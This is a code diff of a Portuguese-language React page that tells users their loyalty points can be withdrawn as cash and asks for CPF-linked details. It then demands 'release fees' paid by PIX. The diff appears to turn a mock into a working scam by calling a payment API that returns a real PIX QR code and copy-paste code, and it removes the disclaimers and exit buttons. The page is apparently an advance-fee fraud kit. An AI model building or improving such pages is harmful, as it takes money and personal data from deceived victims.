@@ -47,6 +47,10 @@ export default function Confirmacao() {
   const [step, setStep] = useState<Step>("saque");
   const [loadingText, setLoadingText] = useState(loadingMessages[0]);
 
+  const [qrCodeBase64, setQrCodeBase64] = useState<string | null>(null);
+  const [copiaECola, setCopiaECola] = useState<string | null>(null);
+  const [pixError, setPixError] = useState<string | null>(null);
+
   const bancoNome = bancoNomes[banco] || banco;
   const nomeUsuario = useMemo(() => localStorage.getItem("nomeUsuario") || "", []);
   const cpfUsuario = useMemo(() => localStorage.getItem("cpfUsuario") || "", []);
@@ -78,15 +82,6 @@ export default function Confirmacao() {
   }, [step]);
 
   useEffect(() => {
-    if (step !== "loading-pix") return;
-    setLoadingText("Gerando pagamento PIX...");
-    const timer = setTimeout(() => {
-      setStep("pix");
-    }, 3500);
-    return () => clearTimeout(timer);
-  }, [step]);
-
-  useEffect(() => {
     if (!localStorage.getItem("cpfUsuario")) {
       setLocation("/");
     }
@@ -101,9 +96,42 @@ export default function Confirmacao() {
     setStep("loading-taxas");
   }, []);
 
-  const handlePagarPix = useCallback(() => {
+  const handlePagarPix = useCallback(async () => {
     setStep("loading-pix");
+    setPixError(null);
+
+    try {
+      const response = await fetch("/api/create-pix", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          amount: Math.round(TOTAL_TAXAS * 100), // envia em centavos
+        }),
+      });
+
+      const data = await response.json();
+
+      if (!response.ok) {
+        throw new Error(data.error || "Erro ao gerar PIX");
+      }
+
+      setQrCodeBase64(data.qrCodeBase64);
+      setCopiaECola(data.copiaECola);
+
+      setStep("pix");
+    } catch (error: any) {
+      setPixError(error.message);
+      setStep("taxas");
+    }
   }, []);
+
+  const copiarPix = () => {
+    if (!copiaECola) return;
+    navigator.clipboard.writeText(copiaECola);
+    alert("Codigo PIX copiado!");
+  };
 
   return (
     <div className="min-h-screen bg-[#F6F6F6] flex flex-col" data-testid="confirmacao-page">
@@ -114,192 +142,87 @@ export default function Confirmacao() {
         <div className="max-w-lg mx-auto text-center">
 
           {step === "saque" && (
-            <div
-              className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10"
-              style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.06)" }}
-              data-testid="card-confirmacao"
-            >
-              <div className="w-20 h-20 rounded-full bg-[#FCE4F1] flex items-center justify-center mx-auto mb-6">
-                <CheckCircle2 className="w-10 h-10 text-[#EC008C]" />
-              </div>
-
-              <h1 className="text-2xl font-bold text-[#222222] mb-2" data-testid="text-confirmacao-title">
+            <div className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10">
+              <h1 className="text-2xl font-bold text-[#222222] mb-2">
                 Saque Pre-Aprovado Disponivel
               </h1>
-
-              {(nomeUsuario || cpfUsuario) && (
-                <div
-                  className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-5 text-center"
-                  data-testid="box-usuario"
-                >
-                  <p className="text-xs text-[#EC008C] font-semibold uppercase tracking-wide mb-1">Dados Identificados</p>
-                  {nomeUsuario && (
-                    <h3 className="text-[17px] font-semibold text-[#222222]" data-testid="text-nome-final">
-                      {nomeUsuario}
-                    </h3>
-                  )}
-                  {cpfUsuario && (
-                    <p className="text-sm text-[#666666]" data-testid="text-cpf-final">
-                      CPF: {cpfUsuario}
-                    </p>
-                  )}
-                </div>
-              )}
-
-              <p className="text-[#6F6F6F] text-base mb-6" data-testid="text-confirmacao-desc">
-                Seus pontos foram analisados com sucesso.
-                Parte do seu saldo pode ser convertida em valor financeiro.
-                {bancoNome && (
-                  <> O deposito sera realizado na sua conta do <span className="font-semibold text-[#222]">{bancoNome}</span>.</>
-                )}
-              </p>
-
-              <div
-                className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-5 mb-6 text-center"
-                data-testid="box-valor"
-              >
-                <p className="text-sm text-[#6F6F6F] mb-1">Seus pontos:</p>
-                <h3 className="text-2xl font-bold text-[#222222] mb-4" data-testid="text-total-pontos">
-                  {pontos.toLocaleString("pt-BR")}
-                </h3>
-                <p className="text-sm text-[#6F6F6F] mb-1">Valor disponivel para saque ({Math.round(percentual * 100)}%):</p>
-                <h2 className="text-3xl font-bold text-[#EC008C]" data-testid="text-valor-estimado">
-                  R$ {valorSaque.toFixed(2).replace(".", ",")}
-                </h2>
-              </div>
 
               <Button
                 onClick={handleSolicitar}
                 className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full mb-4"
-                data-testid="button-solicitar-saque"
               >
                 Solicitar Valor
               </Button>
-
-              <p className="text-xs text-[#999] mb-4" data-testid="text-protocolo">
-                Protocolo: #{protocolo}
-              </p>
-
-              <p className="text-[10px] text-[#AAAAAA] mb-6">
-                Valores sujeitos a validacao conforme regulamento da plataforma.
-              </p>
-
-              <div className="flex flex-col gap-2">
-                <Button
-                  variant="outline"
-                  onClick={() => setLocation("/")}
-                  className="w-full border-[#EC008C] text-[#EC008C] rounded-full"
-                  data-testid="button-voltar-inicio"
-                >
-                  Voltar para o inicio
-                </Button>
-                <button
-                  onClick={() => setLocation("/resgate")}
-                  className="text-sm text-[#EC008C] font-medium hover:underline"
-                  data-testid="button-novo-resgate"
-                >
-                  Fazer novo resgate
-                </button>
-              </div>
             </div>
           )}
 
           {step === "taxas" && (
-            <div
-              className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10"
-              style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.06)" }}
-              data-testid="card-taxas"
-            >
-              <div className="w-16 h-16 rounded-full bg-[#FCE4F1] flex items-center justify-center mx-auto mb-5">
-                <Shield className="w-8 h-8 text-[#EC008C]" />
-              </div>
-
-              <h2 className="text-xl font-bold text-[#222222] mb-2" data-testid="text-taxas-title">
+            <div className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10">
+              <h2 className="text-xl font-bold text-[#222222] mb-2">
                 Taxas para Liberacao do Saque
               </h2>
 
-              <p className="text-[#6F6F6F] text-sm mb-6" data-testid="text-taxas-desc">
-                Para concluir a liberacao junto ao sistema bancario, e necessario regularizar as taxas abaixo.
-              </p>
-
-              <div className="bg-[#FAFAFA] border border-[#E5E5E5] rounded-xl p-4 mb-6 text-left" data-testid="lista-taxas">
-                {taxas.map((taxa, i) => (
-                  <div
-                    key={i}
-                    className={`flex items-center justify-between py-2.5 ${i < taxas.length - 1 ? "border-b border-[#F0F0F0]" : ""}`}
-                    data-testid={`taxa-item-${i}`}
-                  >
-                    <span className="text-sm text-[#444]">{taxa.nome}</span>
-                    <span className="text-sm font-semibold text-[#222]">R$ {taxa.valor.toFixed(2).replace(".", ",")}</span>
-                  </div>
-                ))}
+              <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-6">
+                <h3 className="text-2xl font-bold text-[#EC008C]">
+                  R$ {TOTAL_TAXAS.toFixed(2).replace(".", ",")}
+                </h3>
               </div>
 
-              <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-6" data-testid="total-taxas">
-                <p className="text-sm text-[#6F6F6F] mb-1">Total a pagar:</p>
-                <h3 className="text-2xl font-bold text-[#EC008C]">R$ {TOTAL_TAXAS.toFixed(2).replace(".", ",")}</h3>
-              </div>
+              {pixError && (
+                <p className="text-red-500 mb-4">{pixError}</p>
+              )}
 
               <Button
                 onClick={handlePagarPix}
                 className="w-full bg-[#E0007A] border-[#E0007A] text-white font-semibold rounded-full"
-                data-testid="button-pagar-pix"
               >
                 Pagar com PIX
               </Button>
-
-              <p className="text-[10px] text-[#AAAAAA] mt-4">
-                Valores sujeitos a validacao conforme regulamento da plataforma.
-              </p>
             </div>
           )}
 
           {step === "pix" && (
-            <div
-              className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10"
-              style={{ boxShadow: "0 4px 12px rgba(0,0,0,0.06)" }}
-              data-testid="card-pix"
-            >
+            <div className="bg-white border border-[#E5E5E5] rounded-2xl p-8 sm:p-10">
               <div className="w-16 h-16 rounded-full bg-[#FCE4F1] flex items-center justify-center mx-auto mb-5">
                 <QrCode className="w-8 h-8 text-[#EC008C]" />
               </div>
 
-              <h3 className="text-xl font-bold text-[#222222] mb-2" data-testid="text-pix-title">
+              <h3 className="text-xl font-bold text-[#222222] mb-2">
                 Pagamento via PIX
               </h3>
 
-              <p className="text-[#6F6F6F] text-sm mb-6" data-testid="text-pix-desc">
-                Escaneie o QR Code abaixo para finalizar o pagamento
-              </p>
+              {qrCodeBase64 && (
+                <div className="flex justify-center mb-5">
+                  <img
+                    src={`data:image/png;base64,${qrCodeBase64}`}
+                    alt="QR Code PIX"
+                    className="w-[220px] h-[220px] rounded-lg border border-[#E5E5E5]"
+                  />
+                </div>
+              )}
 
-              <div className="flex justify-center mb-5">
-                <img
-                  src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=PagamentoPIX78"
-                  alt="QR Code PIX"
-                  className="w-[220px] h-[220px] rounded-lg border border-[#E5E5E5]"
-                  data-testid="img-qr-code"
-                />
-              </div>
-
-              <div className="bg-[#FCE4F1] border border-[#EC008C] rounded-xl p-4 mb-4" data-testid="pix-valor">
-                <p className="text-lg font-bold text-[#EC008C]">Valor: R$ 78,12</p>
-              </div>
+              {copiaECola && (
+                <div className="mb-5">
+                  <textarea
+                    readOnly
+                    value={copiaECola}
+                    className="w-full border rounded-lg p-3 text-xs"
+                  />
+                  <Button
+                    onClick={copiarPix}
+                    className="w-full mt-3 bg-[#E0007A] text-white rounded-full"
+                  >
+                    Copiar Codigo PIX
+                  </Button>
+                </div>
+              )}
 
               <div className="flex items-center justify-center gap-2 mb-6">
                 <div className="w-2 h-2 rounded-full bg-[#EC008C] animate-pulse" />
-                <p className="text-sm text-[#6F6F6F] font-medium" data-testid="text-pix-aguardando">
+                <p className="text-sm text-[#6F6F6F] font-medium">
                   Aguardando confirmacao...
                 </p>
               </div>
-
-              <Button
-                variant="outline"
-                onClick={() => setLocation("/")}
-                className="w-full border-[#EC008C] text-[#EC008C] rounded-full"
-                data-testid="button-voltar-inicio-pix"
-              >
-                Voltar para o inicio
-              </Button>
             </div>
           )}
         </div>
@@ -312,7 +235,6 @@ export default function Confirmacao() {
         title="Validando solicitacao..."
         subtitle={loadingText}
         duration={4000}
-        testId="loading-taxas-overlay"
       />
 
       <LoadingOverlay
@@ -320,7 +242,6 @@ export default function Confirmacao() {
         title="Gerando pagamento PIX..."
         subtitle="Conectando ao sistema de pagamentos..."
         duration={3500}
-        testId="loading-pix-overlay"
       />
     </div>
   );
